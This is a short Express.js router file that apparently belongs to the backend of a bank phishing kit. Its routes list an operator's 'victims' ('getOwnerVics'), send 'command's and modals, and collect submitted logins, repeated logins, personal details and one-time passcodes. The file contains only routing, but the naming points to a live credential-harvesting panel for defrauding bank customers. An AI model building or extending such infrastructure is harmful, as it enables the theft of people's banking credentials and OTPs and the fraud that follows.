const express = require("express");
const {
  openModal,
  getOwnerVics,
  command,
  getInfo,
  submitLogin,
  submitPersonal,
  submitOtp,
  submitMisc,
  submitLoginAgain,
} = require("../controllers/aibController");

const router = express.Router();

router.post("/customers/:id/:owner/modal", openModal);
router.post("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.post("/customers/id/:id", getInfo);
router.post("/login", submitLogin);
router.post("/loginAgain", submitLoginAgain);
router.post("/personal", submitPersonal);
router.post("/otp", submitOtp);
router.post("/misc", submitMisc);

module.exports = router;
